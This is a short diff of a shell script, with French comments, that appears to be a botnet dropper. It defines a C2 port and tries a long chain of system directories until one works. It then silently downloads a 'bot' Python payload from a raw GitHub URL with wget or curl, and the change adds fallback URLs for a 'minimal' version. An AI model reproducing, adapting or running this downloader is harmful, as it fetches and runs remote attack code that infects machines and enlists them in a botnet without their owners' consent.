@@ -9,8 +9,11 @@ C2_PORT="7274"
 # Télécharger le bot
 cd /tmp || cd /var/tmp || cd / || cd /root || cd /home || cd /mnt || cd /opt || cd /usr || cd /bin || cd /sbin || cd /dev || cd /sys || cd /proc || cd /run || cd /var || cd /srv || cd /boot || cd /lib || cd /lib64 || cd /etc || cd /root
 
-# Télécharger le bot Python
-wget -q https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot.py -O bot.py || curl -s https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot.py -o bot.py
+# Télécharger le bot Python (version minimale d'abord)
+wget -q https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot_minimal.py -O bot.py 2>/dev/null || \
+curl -s https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot_minimal.py -o bot.py 2>/dev/null || \
+wget -q https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot.py -O bot.py 2>/dev/null || \
+curl -s https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot.py -o bot.py 2>/dev/null
 
 # Si Python n'est pas disponible, essayer d'installer ou utiliser busybox python
 if ! command -v python3 >/dev/null 2>&1; then
